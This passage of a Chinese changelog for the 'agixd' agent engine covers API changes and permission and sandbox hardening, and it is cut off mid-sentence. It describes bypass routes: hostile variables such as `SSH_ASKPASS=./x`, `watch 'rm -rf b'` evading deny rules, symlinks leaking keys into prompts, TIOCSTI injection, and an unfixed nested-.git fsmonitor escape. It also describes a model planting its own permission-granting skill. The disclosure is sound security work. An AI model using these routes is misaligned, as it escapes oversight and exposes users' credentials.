  `base::memory`(`team::team_memory` 里照旧可用)。`assemble_prompt` 的 `memory_store` 参数
  现在真的被用来出 `# Memory` 一节,传进去的应是会话的那个 store。`FrozenContext::memory_dir`
  是全局记忆目录,`memory_index` 是两处合并的索引。
- `base::interface::memory::MemoryStore::{compact, with_environment}`、
  `DurableMemory::{staleness_penalty, effective_confidence}`、`team::TeamMemoryStore::compact`
  删除:记忆不再按年龄与置信度自动清理。新增 `assembly::doctor::MemoryCheck`。

#### 子 Agent 与团队

- `base::agent_type::AgentTypeSource::LocalFile` 拆成 `User`(全局 / 场景的 `agents/`)与
  `Project { trusted }`,多了 `may_shadow()`。`agents::agent_tool::{merge_agent_types,
  load_agent_types_from_dir}`、`SharedAgentTypeCatalog::{build, unwatched, refresh}`、
  `AgentTool::with_parent_tools` 的目录参数换成 `&[(PathBuf, AgentTypeSource)]`
  (`load_agent_types_from_dir` 多一个 `source`);新增 `agent_type_dirs(&Settings)` 按设置给出这三层。
- `AgentSpawner::spawn_agent_with_tools` 的默认实现在收到非空 `extra_tools` 或 `permission_mode`
  时返回错误,不再悄悄丢掉它们去调 `spawn_agent`;支持团队的 spawner 要自己实现它。
  `RuntimeAgentSpawner` 按 `allowed_tools`(非空时)收窄子 Agent 的工具,以前忽略。
- `Agent` 被丢弃时清空它的会话工具注册表(`InMemoryToolRegistry::clear`,新增),并取消
  `SessionContext::session_ended()`(新增)给出的令牌;模块里活得比一轮长的东西(常驻成员)
  挂在它上面。会话的工具彼此引用(`Agent` 工具在它所在的注册表里、团队工具经 spawner 回到
  `Agent` 工具),不清空的话整套都不会被释放。`AgentTool::set_hooks` 只弱持 runner;新增
  `AgentTool::set_session_ended`。
- `ExecutionSettings` 多了 `max_agent_depth`。
- `team::mailbox::MailboxStore::send` 返回 `Result<(), UnknownPeer>`,不是成员的收件人被拒;
  新增 `MailboxStore::check_peer` 与 `team::mailbox::mailbox_file`(标签到文件名)。
- `AgentSpawner::spawn_agent_with_tools` 多了最后一个参数 `seat: Option<TeamSeat>`(新类型
  `base::interface::agent_spawner::TeamSeat { team, member }`);自己实现这个方法的要加上。
- `agents::agent_tool::AgentTool` 起的子 Agent 用 `set_hooks` 给的那个 runner(经
  `Builder::hooks`),不再从 settings 另建。
- `AgentSpawner` 多了 `spawn_agent_on_model(prompt, cwd, cancel, model)`(agent hook 的 `model`
  走它),缺省实现拒绝;只有 `RuntimeAgentSpawner` 真正实现。

#### 遥测

- `telemetry`:`EventPayload` 去掉"遥测"一节里去掉的那 15 种事件与 `shutdown_signal`及其 payload 类型,多了 `KINDS`;
  `TurnStartPayload` / `TurnCompletePayload` 去掉 `turn_no` / `turn_id`,`UserPromptSubmitPayload`
  只剩 `char_count` / `attachment_count`,`SlashCommandUsedPayload` 是 `{command, kind, has_arg}`,
  `ApiErrorPayload` 的 `http_status` 变 `Option<u16>`、去掉 `retry_count`,
  `PermissionDecisionPayload` 去掉 `rule_source`、`PermissionDecisionOutcome` 去掉
  `Escalated` / `Remembered`,`AgentSpawnedPayload` 是 `{agent_id, role, model?, stage_name?,
  background}`,`AgentCompletedPayload` 去掉 `turn_count` / `tool_call_count`,
  `McpServerConnectedPayload` / `McpConnectionErrorPayload` 精简,`StartupTimingPayload` 见上,
  `SessionEndPayload` 去掉 `total_cost_usd` / `total_errors`。`telemetry::cost`、`telemetry::stats`
  删除。`RedactionPolicy` 与 `TelemetryConfig` 去掉 `redact_prompts` / `redact_tool_content`
  (`RedactionPolicy` 还去掉 `redact_secrets`、`has_content_redaction`),新增
  `RedactionPolicy::scrub_message`。`TelemetryHandleError` 多了 `Io`,`FileRecorder::record`
  写失败返回它;新增 `FileRecorder::with_max_bytes`,去掉 `FileRecorder::exists`。
  `telemetry`:删除 `ShutdownSignalPayload` 与 `TelemetryEvent::shutdown_signal`。`FileRecorder`
  建的文件是 `0600`,为它新建的那一层目录是 `0700`。
- 进程级 OTel 导出器由 `assembly::telemetry_otel::process_exporter(endpoint)` 起(原先在 `SessionPool` 里);**嵌 daemon 的进程退出前必须调 `assembly::telemetry_otel::shutdown_process_exporter()`**(`agixd` 在监听器退出后调),否则丢最后一批数据。`TelemetryRecorder::shutdown` 对 `OtelExporter` 只 `force_flush`、不再关掉进程级 provider。第二个 pool 配的不同 `endpoint` 被忽略。

#### 会话与存储

- `history::store::HistoryStore` 多了 `sync` 与 `claim`(都有缺省实现),新类型
  `history::store::SessionClaim`;`HistoryError` 多了 `Locked`(穷举匹配的要补一支)。
  `JsonlHistoryStore` 的 `append` 不再承诺立即持久,`sync` 才是;`delete` 在会话被别的进程
  占着时报 `Locked`。`SessionManager::persist` 写了东西就 `sync` 一次。包装别的 store 的
  实现要把这两个方法转发下去,否则拿到的是什么都不做的缺省。
- `history::blob::PasteStore::cleanup` 删除(按 mtime 删,不管还有没有日志引用)。
  `JsonlHistoryStore` 的写锁按会话分开,一个会话的 IO 卡住不再挡别的会话;
  `set_session_title` 与 append 拿同一把锁,另一个进程占着这个会话时同样报 `Locked`。
- `transcript::ExtensionsAreVisible` 对它不覆盖的扩展条目照引擎的规矩处理(`agix.context` 的
  drop / edit 照样生效);`LogEntry::ToolResult` 只并进全是工具结果的末尾 User,同一个
  `tool_use_id` 只并一次。

#### daemon

- `daemon::write_lock_file` 返回 `DaemonLockGuard`(`Deref` 到 `DaemonLock`),持有期间占着
  `flock`,drop 时删掉锁文件;不要再自己删。新增 `discovery::create_private_dir`。
- `SessionPool::shutdown_all` 一开始就拒绝再建会话,重复调用等第一次做完。新增
  `DaemonServer::shutdown()`:先停监听再 `shutdown_all`,自己先 `shutdown_all` 再取消
  `shutdown_token` 的嵌入方改用它。
- `rpc::SessionOptions::from_params` 与 `rpc::IgnoredOption` 新增,`SessionOptions::FIELDS`
  列出全部字段名。`base::settings::unknown_settings_keys` 新增。

#### 插件、脚本与工具

- `SkillCatalog` 多了 `expand`(有缺省实现:正文加参数替换,不执行、不授权),返回新类型
  `base::interface::skill_catalog::SkillExpansion { text, grants }`;包一层 `SkillCatalog` 的
  要把它转发下去,否则 `/name` 拿到的是缺省展开。新增 `skills::expand_for_invocation` /
  `skills::ExpandError` 与 `CommandRegistry::run_prompt_command`(斜杠命令在轮里走的就是它)。
  `SkillManager::get_skill_content` 对磁盘 skill 返回去掉 frontmatter 的正文。
- `plugin::cache::check_component` 新增;`plugin::install::{install, uninstall}` 与
  `PluginCache::remove_version` 对不合规的 `name` / `version` 返回 `PluginError::Schema`,
  `remove_version` 还拒绝解析到 cache 之外的插件目录。
- `plugin::blocklist` 模块与 `PluginError::Blocked` 删除。`plugin::manifest::Plugin::path`
  返回 `Result<PathBuf, PluginError>`(解析符号链接后不在包里就报错)。`PluginCache::is_cached`
  要求有 `plugin::cache::INSTALLED_MARKER`;新增 `PluginCache::{lock, plugin_dir}`、
  `plugin::install::{MAX_ARCHIVE_BYTES, UnpackLimits}`、`EnableState::{path, fault}`。
- `assembly::plugins::PluginSubsystem::disclosure` 删除(只给 `plugin.install` 用,结果在它的
  响应里),新增 `health_check()`。
- `ScriptCarrier` 多了 `limits()`;`call_blocking` 在多线程运行时的工作线程上经
  `tokio::task::block_in_place` 跑脚本。新增 `script_host::bindings::{MAX_LIMITS,
  PACKAGE_MAX_LIMITS}`。
- 新增 `ptc::default_run_slots()` 与 `RunCodeTool::with_run_slots`。
- `plugin::McpKind::Dsh`、`McpPayload` 的 `entry` / `env`、`plugin::locate` 模块删除(`[[mcp]] kind = "dsh"` 现被拒,见上)。
- `WebFetch`:`tools::SecondaryLlm` trait、`tools::secondary_llm` 模块与 `with_secondary_llm` 删除(tools 不再依赖 model),换成 `tools::page_extract::PageExtractor`(`dyn Model` + 模型名)与 `tools::register_web_fetch(registry, Option<(model, name)>)`,新增 `call_purpose::WEB_FETCH`。有模型时它替换表里的 WebFetch,没有时保留已有的(子 Agent 承接父会话那个),表里没有才注册一个不抽取的。`register_builtin_tools` 仍注册不抽取的 WebFetch,直接用注册表的嵌入方不受影响。

#### 删除的 API

- `team::prompt::build_coordinator_prompt` 删除(没有地方读它)。
- `runtime::context`(`AgentContext`)删除,从来没有调用方。
- `team::lock` 删除(没有调用方)。`AgentTool::resume_agent`、`Agent::seed_history` 删除(只有
  测试调用)。
- 删除没有调用方的 `base::rpc`、`base::log`(`base::interface::log`:`Logger`、`NoopLogger`、
  `LogRouter` 与 `log_*!` 宏)、`tools::aliases`(`BriefTool`、`PowerShellTool`、`ReplTool`)
  与 `assembly::session_manager`(`daemon::session_manager`)。日志用 `tracing`。
- `hooks::HookRunner::set_network`、`auth::OAuth2Client::with_network` 删除;后者要换出口直接设
  `net` 字段。
- **公开 API 的死代码清理。** 下面这些 `pub` 项从未被接上或没有调用方,已删除;用到的要改。
  - 整个 `task` crate(`DreamTask`、`RunningTaskStore`、`TeamDeleteTool` 等)与 `base::features::dream_task`。
  - 整个模块:`base::intent`、`base::result`(`ToolResult` / `ProgressSender` 的第二套实现)、`compaction::cleanup`、`mcp::registry`(`official_registry`)、`team::polling`(`MailboxPoller`、`start_polling`……)、`team::protocol`(`ProtocolMessage`……)、`telemetry::feature_flags`(`FeatureFlagClient`……)、`telemetry::env_metadata`(`collect_env_metadata`……);`compaction::session_memory`、`tools::bash::safety`、`tools::bash::sed_validate` 本来就没被编译。
  - `compaction::CompactStrategy::SessionMemory`;`assembly::rpc::codes::SESSION_CAP_REACHED`。
  - `tools::assemble_tool_pool` / `assemble_tool_pool_refs`;`AgentTool::with_mailbox`;`team::coordinator` 的 `PermissionBridge`、`PermissionPrompt`、`create_permission_bridges`、`aggregate_stage_results`(父端从未存在)。
  - `runtime::commands` 的 `CommandResult`、`handle_local_command`、`Command::Local { handler }`,`insert_local` 改成两个参数(斜杠命令在 `turn.rs` 按名字分发)。
  - `model::AnthropicError::is_context_limit_error`。
  - `mcp::McpManager` 的 `connect_all_with_env` / `connect_all_with_callback`、`server_inventory`(及 `ServerInventory`)、通知 handler 一套(`McpNotificationHandler`、`register_notification_handler`、`dispatch_notification`、`set_notification_allowlist`)、`tool_permissions` / `is_tool_allowed` / `set_tool_permissions`(由权限规则负责)、`on_elicitation`;`mcp::make_mcp_tools`、`McpServerState` 与 `server_states`。
  - `SessionState`:`PermissionDenial` 与 `record_denial` / `drain_denials` / `check_denial_escalation`,running task 持久化(`RunningTaskPersist`、`register_running_task`、`with_running_task_store`……),todo 提醒(`record_todo_write_turn`、`turns_since_todo_write`、`check_verification_nudge`、`todos_summary`),`plan_slug`,`sandbox_allow_writes`;`FrozenContext::relevant_memories` / `with_relevant_memories`;`MemoryStore::scan_memory_headers`。
  - `Paths::{global_agents_dir, global_rules_dir, global_hooks_dir}`、`PermissionMode::is_safe_default`、`base::interface::tool` 的 `extract_tool_name`。
  - `hooks::HookRunner::{with_default_timeout, with_wake_receiver, register_hook}`;`runtime::agent::Agent::{session_info, set_model, skills_arc, run_hooks}`;`scene::declarative` 的 `with_extra_tools`;`script_host` 的 `with_memory_limit`;`Session::set_parent_session`;`SkillManager::{expand_skill, build_skills_prompt}`。
  - `compaction`:`strip_images_from_messages`、`grouping::estimate_tokens_with`、`CachedMicrocompact` 的 `mark_tools_sent_to_api` / `get_pinned_cache_edits` / `build_cache_edits` / `format_cache_edit`;`history::transcript::{compact_summary_from_messages, latest_stop_reason}`;`assembly::discovery::read_lock_file`;`SessionPool::project_settings_path`。

### 计划中的缺省变化

下面几项在 0.3.10 里仍是旧缺省,计划在后续 0.3.x 版本改,具体版本发布说明另行通知。现在就可以按新缺省试跑,迁移时改的地方各节里已写明。

- `project_trust.default` 改为 `untrusted`:没被信任的项目的 hooks、MCP server、脚本、provider 端点等不生效(见"项目信任")。分两步:设置与 doctor 告警已有;翻缺省等宿主的信任对话框发布后再做。全局 `settings.json` 里先写 `"project_trust": {"default": "untrusted"}` 试跑,`daemon.doctor` 与 `project.status` 会列出被扣下的东西。
- 插件缺省不再自动加载,要用的显式启用。分两步:0.3.11 起提供 `plugins.enable_on_install`(缺省 `true`,行为不变),之后再翻缺省。
- `sandbox.unattended_requires_network_policy` 缺省改为 `true`:无人值守会话里 `Bash` 与 `Monitor` 的"沙箱完整生效即自动放行"另外要求 `sandbox.network_mode` 不是 `unrestricted`(见"权限与沙箱")。分两步:0.3.11 起 `daemon.doctor` 对"无人值守 + 网络 unrestricted + 开关关着"告警,之后再翻缺省。
- `session.create` / `session.run_turn` / `session.resume` 的 `options` 严格解析:不认识的字段、读不出来的值报 `INVALID_PARAMS`,不再被忽略。分两步:0.3.11 起 `permission_rules` 里一条坏规则只丢那一条(不再连累整个字段),并提供 opt-in 的严格解析(`options.strict: true`),之后再缺省严格。现在就把 `result.ignored_options` 当错误处理。

## 0.3.10 之后:到 0.3.11

**最低 Rust 版本从 1.80 升到 1.88**(`workspace.package.rust-version`)。自己从源码构建 `agixd`
的、把引擎当依赖编进宿主的,旧工具链直接编不过,先升级 `rustup`;只用发布出来的二进制的不受影响。

### 部署 `agixd` 的

#### 权限与沙箱

- **部署方的 managed 设置。** 系统路径上的 `managed-settings.json`(macOS
  `/Library/Application Support/Agix/`,Linux 等 `/etc/agix/`,Windows `%ProgramData%\Agix\`;
  `--managed-settings <路径>` 换成别的文件,这个文件必须存在)是一层用户、项目、模型都改不了的
  设置,只认 `permission_rules` 与 `disable_bypass_permissions_mode`。它的 deny / ask 压过下层
  的 allow,在 `bypassPermissions`(含 `auto` / `yolo`)下照样生效;`disable_bypass_permissions_mode:
  true` 让 bypass 一律按 `default` 运行。文件读不了、有别的键、值不对时拒绝所有工具调用,
  `daemon.doctor` 的 `settings.managed` 报 `failing`。没有这个文件的部署不受影响
  (`ARCHITECTURE.md` §6.1"用户规则与部署方规则")。
- **设置文件里的 `permission_rules` 逐条读。** 以前一层里有一条规则读不出来(如
  `"action": "allwo"`),这一层的规则全部被丢掉,deny 也跟着失效,只有一条 warn;现在只丢那一条,
  `daemon.doctor` 的 `settings.tiers` 报 `degraded`,`settings_tiers[].ignored_values` 里的 `key`
  是 `permission_rules[0]` 这样带下标。
- **新增 `--unix-socket-auth`(缺省关)。** 打开后 unix socket 连接也要先 `daemon.auth`:token 用
  `--token` / `AGIX_DAEMON_TOKEN` 给的,再没有就是 TCP / WebSocket 监听在用的那个,都没有才每次启动生成一个,写进
  `~/.agix/daemon/auth/<instance>.token`(沙箱里的命令读不到)。实例文件多 `unix_socket_auth` 与
  `token_file` 两个键,只在打开了这个开关(`token_file` 只在 token 是生成的)时才写。它缓解的是"沙箱外的命令 `setsid` 之后连上 socket"(没装 bwrap 的 Linux、
  `dangerously_disable_sandbox`),细节见 `ARCHITECTURE.md` §6.3。之后的版本可能改为缺省开,
  宿主现在就该支持在 unix socket 上握手:实例文件里 `unix_socket_auth` 为真时,先发 `daemon.auth`。
- **`daemon.doctor` 新增 `sandbox.unattended_network`。** 服务无人值守场景、`sandbox.network_mode`
  为 `unrestricted`、`sandbox.unattended_requires_network_policy` 关着,三条同时成立时报 `degraded`。
  这个开关计划在后续 0.3.x 版本改为缺省开;现在就在全局 `settings.json` 里写
  `"sandbox": {"unattended_requires_network_policy": true}`(或把 `network_mode` 改成 `deny_all` /
  `allowlist`)即可消掉告警并按新缺省试跑。
- **引擎读进提示词的文件也过凭据名单,项目内容不跟随指出项目的链接。** 以前项目里提交
  `.agents/skills/notes.md -> ../../.agix/settings.local.json` 或 `AGENTS.md -> .agix/settings.local.json`
  这样的符号链接,key 文件的内容就进了 skill 列表或系统提示词,未信任的项目也一样。现在 skill、
  `AGENTS.md`、rules、agent 定义、output style、memory、文件附件等引擎自己读的文件先解析链接:
  落在凭据里的不读;写在项目根下、指到项目根之外的也不读;两种都记一条 warning。依赖"项目里
  的 skill / agent / `AGENTS.md` 链到项目外"的(常见于 monorepo 子包里链向仓库别处),改成在
  仓库根起会话,或把共享的 skill 装到用户层;上层目录的 `AGENTS.md` 仍由向上查找直接读到
  (`ARCHITECTURE.md` §6.1"两份敏感路径名单")。插件包里的文件落在凭据位置上同样拒绝加载。
- **`dontAsk` 会话的子 Agent 也是 `dontAsk`。** agent 类型 frontmatter 的 `permission_mode`
  以前在父会话是 `dontAsk` 时照样生效,写 `bypassPermissions` 的类型能让子 Agent 免规则运行;
  现在与 `plan` 一样取两者中更严的那个,也就是 `dontAsk`。
- **`acceptEdits` 下读项目外的文件要询问,与 `default` 一致。** 以前 `Read` / `Glob` / `Grep`
  读项目外、`cat ~/Documents/x` 这类只读 `Bash` / `Monitor` 命令在 `acceptEdits` 下免询问;
  现在会话工作目录、`sandbox.additional_directories`、`sandbox.read_directories` 之外的读照样
  询问(无人值守的会话里 `Read` / `Glob` / `Grep` 就是拒绝,`Bash` / `Monitor` 仍按"沙箱完整
  生效即放行")。`acceptEdits` 下要免询问读的目录,写进
  `sandbox.read_directories`(或开 `sandbox.read_anywhere`)。
- **Bash 只读通道收窄(免确认的命令变少)。** 主机由参数决定、或会按项目文件选二进制的查询不再免确认:
  `brew` 整个移出(`brew list` 也读 `HOMEBREW_*`),`npm view` / `npm list`、`node --version`、
  `pip list` / `pip show`、`git remote show` 移出(`git remote` 只认光秃秃的、`-v`、`get-url`)。
  asdf / nvm / volta / pyenv 下 `node --version` 这类是按项目文件选二进制的 shim,与 `cargo --version`
  同理。危险变量的识别加了前缀 `HOMEBREW_`、`SSH_`,后缀 `BROWSER`、`EDITOR`,以及 `VISUAL`;
  `HOMEBREW_BROWSER=./x.sh brew info …`、`SSH_ASKPASS=./x git remote show …` 这类以前在 `default` /
  `plan` 下零确认就会起项目里的脚本。依赖这些命令免确认的会话,为它们写 allow 规则。
  另有四处同方向的收紧:`yq -s` / `--split-exp` / `--in-place`、`tree -R`、`ss -D`、`lshw -dump`
  这些能写文件的选项不再算只读;`Bash(ls:*)` 这样的 allow 规则不再放行 `PATH=. ls`
  (带危险变量的命令按原文比 allow,deny / ask 仍按实际启动的程序比);deny 规则穿透
  `watch`、`script -c`、`parallel`、`arch` 四个 wrapper(`watch 'rm -rf b'` 不再绕得过 `Bash(rm:*)`)。
- **unix socket 每次 accept 校验对端 uid**,与 daemon 的 euid 不同就丢弃连接(以前只靠
  bind 之后的 chmod,umask 决定那一刻的权限)。同一用户下的宿主不受影响。
- **沙箱里的命令读得到的少了。** 缺省的 `deny_read` 多了 `~/.git-credentials`、
  `~/.config/git/credentials`、`~/.config/gcloud`、`~/.cargo/credentials{,.toml}`、`~/.vault-token`
  等(全表见 `base::interface::exec::default_deny_read_in`),要用的用 `sandbox.allow_read` 放开;
  状态目录与各场景目录下的 `settings*.json`、`mcp.local.json` 和 `mcp/oauth/`,以及项目的
  `.agix/settings.local.json`、`.agix/mcp.local.json` 一律读不到。
  无人值守的会话另外读不了钥匙串(`security`)、连不上 tmux / screen。子模块 git 目录里的
  `config`、`hooks/` 等和主仓库的一样只读,沙箱里的 `git submodule sync` 之类会失败(§6.3)。
- **监听关了,端口和 socket 不再被沙箱围着。** 以前进程里关掉的监听器的端口、socket 路径一直被
  挡,之后别的服务用到也连不上;现在跟监听器一起注销,`--unix-socket-auth` 的 token 文件也是
  删掉时注销。Linux 上本来就围不了单个端口,网络开着时沙箱里的命令连得上 TCP / WebSocket 端口,
  要断就用 `network_mode: deny_all` / `allowlist`(§6.3)。
- **Linux 上命令放到后台的进程活过命令本身,与 macOS 一致。** 以前 bwrap 带
  `--die-with-parent`,命令一退出,它的 PID 命名空间连同 `npm run dev > log &` 这样的进程一起
  被收掉;bwrap 的 PID 1 又一直占着命令的输出,`Bash` 等 1 秒后还会停掉它们并报"后台进程占着
  输出"。现在输出另有去处的后台进程留着,`sandbox.reap_process_groups` 打开时随会话收掉;daemon
  被 `SIGKILL` 时正在跑的命令也不再跟着死,由下一次启动按上次的进程组记录收掉。命令仍在自己的
  PID 命名空间里:`$!` 不是宿主上的 pid,后一条命令也看不见前一条留下的进程。
- **Linux 上包裹 bwrap 的外层 sh 收紧了。** 外层 sh 在沙箱外运行,以前它的 `mktemp` 跟着
  会话 `TMPDIR`(沙箱里可写的根)建临时文件,前一条命令留下的后台进程能趁 `mktemp` 与打开它
  之间把它换成符号链接,让外层在沙箱外写任意文件;现在这个临时文件固定建在宿主的 `/tmp`——沙箱
  对 `/tmp` 恒挂私有 tmpfs,沙箱里的命令够不着。外层用到的 `mktemp` / `rm` / `cat` 改用绝对路径,
  不再按宿主 `PATH` 查找,项目里可写目录提前到 `PATH` 上也替换不掉它们。
- **Linux 上状态目录里的凭据改用 tmpfs 整体遮住。** 以前靠逐个 bind 遮每个 key 文件,只对
  wrap 那一刻已存在的文件有效:真机(bwrap 0.8)上 `/dev/null` 挂在文件的 dentry 上,引擎用
  "临时文件 + rename"重写 `settings.local.json` 后这层挂失效,前一条命令留下的后台进程读得到
  新内容;wrap 时还不存在的凭据根本没被挡。现在对装着散落 key 文件的目录(状态目录本身、各
  场景目录)整体盖一层 tmpfs,再把非凭据项逐个只读绑回,`mcp/oauth`、`daemon/auth` 留在 tmpfs
  下不绑回——之后新建或 rename 重写的凭据都落在 tmpfs 下,命令读不到。副作用:命令读状态目录时,
  wrap 之后才新建的**可读**文件(如新起的会话记录)在这条命令里看不到。项目在状态目录之内的
  会话(`project_root` 落在状态目录下)仍走旧的逐文件遮法——整体 tmpfs 会连项目一起遮——那里
  rename 重写是已知残留。
- **沙箱只护项目自己的 `.git`,嵌套仓库不护。** 沙箱里的命令可以在子目录 `git init` 一个仓库、
  写它的 `.git/config`、再 `git add` 成 gitlink 登记进项目 index;用户之后在项目里跑 git(沙箱外)
  会进这个嵌套仓库、照它的配置执行(`core.fsmonitor` 之类)。两个后端都挡不住——禁止新建 `.git`
  会连 `git init`、`git clone`、包管理器拉 git 依赖一起弄坏,在别处建好再挪进来也绕得过。引擎
  自己的 git 带 `-c core.fsmonitor=false` 不受影响。这是已知逃逸(`sandbox.rs` 模块头、§6.3);
  结构性的检测(命令结束后发现项目里新出现的嵌套 `.git` 再告警/询问)留到后续版本。
- **凭据任何模式下都读不到,项目的 skill 目录写入要确认。** 两份名单放在 `base::paths`,gate、
  文件工具与沙箱共用(`ARCHITECTURE.md` §6.1):
  - 状态目录与各场景目录下的 `settings*.json`、`mcp.local*.json`、`mcp/oauth/`,状态目录下的
    `daemon/auth/`,项目的 `.agix/settings.local.json` / `.agix/mcp.local.json`,以及 `.ssh` /
    `.aws` / `.gnupg`:以前状态目录整个是可读的根,`Read` / `Grep` / `Glob` 在 `default` 和
    无人值守会话里不询问就把 key 与 token 读给模型;现在点名它们的调用(含 shell 命令里的路径)
    直接拒绝,不询问,`bypassPermissions` 下也拒绝(以前 bypass 连 `~/.ssh` 都放行);搜状态目录时
    跳过它们。沙箱另外挡住了 `daemon/auth/` 下所有实例的 token(以前只挡本进程那一个)。
    **迁移**:靠模型 `Read` 全局 `settings.json` 的流程(内建 `updateConfig` skill 的全局层与 local
    层)不再可行,由宿主经 `config.get` / `config.setProvider` 等 RPC 或用户自己改;项目提交的
    `.agix/settings.json` 照常可读。
  - 项目的 `.agents/skills/`:以前 `Write` / `Edit` 在 `default` 下不询问,macOS 沙箱里的 `Bash`
    也能写,模型能给自己种一个带 `allowed-tools` 的 skill;现在写工具写这里要确认(无人值守即拒绝),
    沙箱里只读,`.agents` 目录项本身挪不走、不存在时建不出来(Linux 上只在 `.agents` 已存在时挡)。
    `.agents` 下别的路径与项目根的 `AGENTS.md` 不受影响。
- **macOS 上 `network_mode: allowlist` 的沙箱命令又能跑了,但名单里的域名连不上。** 以前
  profile 给每个域名写一条 `(remote tcp "<域名>:*")`,sandbox-exec 只认 `*` 和 `localhost`,
  profile 编译不过,每条 `Bash` / `Monitor` 命令都报 `host must be * or localhost` 失败。现在和
  Linux 一样不放任何域名:出站整个拒绝,名单里有 `localhost` 或回环地址时放开回环。沙箱报
  `Partial`,`unmet` 里列出连不上的域名;所以 `sandbox.require_enforcement: true` 加上带域名的
  allowlist 会拒绝每条沙箱命令,无人值守的会话也不会自动放行它们。命令确实要连这些域名的,
  眼下只能回到 `unrestricted`,按域名放行留待后续版本;`daemon.doctor` 新增的
  `sandbox.network_allowlist` 检查会指出这种配置(§6.3)。`WebFetch` / `Ping` 照旧按名单放行。
- **命令不再有控制终端。** 本机 provider 起每个子进程(`Bash`、`Monitor`、command hook)时改用
  `setsid`,不再只是 `setpgid`:进程组和以前一样以子进程自己为组长,停组、收组的
  行为不变,但命令打不开 `/dev/tty`,没法用 `TIOCSTI` 往前台运行的 `agixd` 所在终端里塞按键、
  等 daemon 退出后由那个终端的 shell 执行。MCP stdio server 从只领进程组改为领会话;引擎自己跑的
  git(连同仓库配置让它跑的 filter driver)和 `Read` 调的 `pdftotext` 以前留在 daemon 的会话里,
  现在也各领一个,引擎的 git 超时后会被杀掉,以前留着继续跑。依赖终端的交互(`sudo` 问密码、
  `ssh` 问 passphrase、MCP server 在终端上提示输入之类)以前会抢 daemon 的终端,现在直接失败。
  bwrap 没有加 `--new-session`,原因见 §6.3。
- **项目 `.agix/` 会多一个 `.gitignore`。** 第一次往项目 `.agix/` 写 `settings.local.json`
  (`config.setProvider` 的 key、MCP headers)或录遥测时,没有 `.agix/.gitignore` 就生成一份,写着
  `settings.local.json`、`mcp.local.json`、`telemetry/`。已有的不动,缺的行也不补:以前就有
  `.agix/.gitignore` 的项目自己核对一下这三项(§8)。
- **项目与插件 skill 的 `allowed-tools` 不再能用通配授权一切。** 以前只拒绝只写工具名的整类授权,
  `Bash(*)`、`Write(**)`、`Edit(/**)` 带了内容就照给,已信任项目或插件里的一个 skill 就能让任意
  `Bash` 免询问;现在够得和整类授权一样远的内容同样不给,记一条 warn。只看第一个通配之前有没有
  字面内容不够——`Write(x/../../../**)` 解析出来就是 `/**`,`Bash(b*)` 的 `*` 跨空格、盖住
  `bash -c '…'`,`WebFetch(https://*.co.uk/**)` 下的子域谁都能注册——所以按工具分别判:路径类
  (`Read` / `Edit` / `Write` / …)按规则匹配时的同一套解析得出模式钉住的目录,它要落在项目根(会话的
  工作目录)之内、且不是项目根本身,按原样写法与解析符号链接之后都算;shell 类(`Bash` / `Monitor`)
  第一个通配之前要是一个完整的程序名加空格(或 `程序名 …:*`),而且这个程序不是 shell、wrapper
  (`bash`、`env`、`sudo`、`xargs`、`find`、`eval` 一类)——它们跑的是参数里写的任何命令;URL 类
  主机里的通配要落在一个可注册的域名之内(按公共后缀列表判,`*.example.com` 给,`*.co.uk`、
  `*.github.io`、`*.com` 不给)。拿不准的按整类授权处理。用户层 skill 不受影响。靠这类写法免询问的
  项目 / 插件 skill,改写成真正收窄的 `Bash(cargo test:*)`、`Write(src/**)`;项目外的路径
  (`Write(/tmp/build/**)`、`Edit(~/notes/**)`)从项目或插件 skill 授权也不再生效。用户自己设置里的
  这类 allow 照旧生效,只是启动时的危险规则告警认得它们(`Bash(sudo:*)` 从 warning 升为 critical)。
- **`WebFetch` / `Ping` 规则按 URL 的各部分匹配。** 以前规则内容是整串 URL 上的 glob,`*` 能跨 `/`,
  `WebFetch(https://*.example.com/**)` 会放行 `https://evil.net/.example.com/`;现在调用的 URL 先
  规整(去 userinfo / query / fragment,主机名小写,默认端口省略),再与模式的 scheme、主机、端口、
  路径分别匹配,主机里的通配只跨 `.`(`ARCHITECTURE.md` §6.1 第 5 条)。**会变的写法**:不是
  `scheme://host[/path]` 形状的 allow(`WebFetch(*example.com*)`)只放行原样相等的 URL,启动时记一条
  warn;`https://h/**` 不再匹配 `https://h:8443/`,要任何端口写 `https://h:*/**`。deny / ask 不会因此
  变窄:它们除了按部分匹配,还照旧按整串 glob 匹配原样的 URL,两种读法任一命中就生效——
  `WebFetch(https://evil.example/*)`、`WebFetch(https://evil.example*)` 仍然拒绝
  `https://evil.example/a/b`。模式这一侧也规整:Unicode 主机转成 punycode(`https://bücher.example/**`
  命中它点名的主机),两侧路径里非保留字符的百分号转义解码(`/%61dmin/` 撞得上 `/admin/**` 的
  deny),`%2F` 这类保留字符不解码。模式里写 `?` 或 `#` 的不再是 URL 模式(`?` 不当通配):作 allow
  只认原样相等,"永久允许"记下的带 query 的 URL 因此只放行它自己;"永久允许"记下的 URL 里有
  `*`、`[`、`{` 的按字面转义后记下。项目或插件 skill 的 `allowed-tools` 里主机钉不住域名的 URL 模式
  (`WebFetch(https://*/**)`)按整类授权处理,不给。
- **设置里点名的密钥变量不再交给子进程。** 以前子进程的环境只剥 `ANTHROPIC_*`、`AGIX_DAEMON_TOKEN`
  与 provider 的 `api_key_env`,MCP OAuth 的 `client_secret_env` 一句 `printenv` 就读得到。现在
  全局层、场景层与插件声明的 MCP server 的 `oauth.client_secret_env`、`oauth.private_key_jwt.key_env`,
  它的 `command` / `args` / `env` / `url` / `headers` 里 `$VAR` 引用的变量,企业 IdP 的
  `client_secret_env`,以及带 `otel` 构建时的 `OTEL_EXPORTER_OTLP_*HEADERS`,同样剥掉——`Bash`、
  `Monitor`、command hook、引擎的 git、`pdftotext` 与 MCP stdio server 都不继承(ARCHITECTURE §5
  第 5 条)。`PATH`、`HOME` 这类 shell 离不开的变量不受影响。**会变的用法**:靠继承拿到别的 server
  或命令也在用的变量的——比如 GitHub MCP server 的 `headers` 写了 `$GITHUB_TOKEN`,而 `Bash` 里的
  `gh` 也靠这个变量——命令里读不到了;要命令也拿到,写进 `sandbox.subprocess_env.allow`。stdio
  server 自己要的密钥写进它的 `env`(`"env": {"GITHUB_TOKEN": "$GITHUB_TOKEN"}`),不要靠继承。
  剥掉的名单只增不减,删掉设置里的点名要重启 daemon 才放回。
- **无项目会话不再把家目录当项目。** `project_root: null` 的会话(`harnix`、`mini` 这类不要求项目
  的场景)以前以状态目录的上一级为工作目录,状态目录是 `~/.agix` 时就是 `~`:`Write` / `Edit`
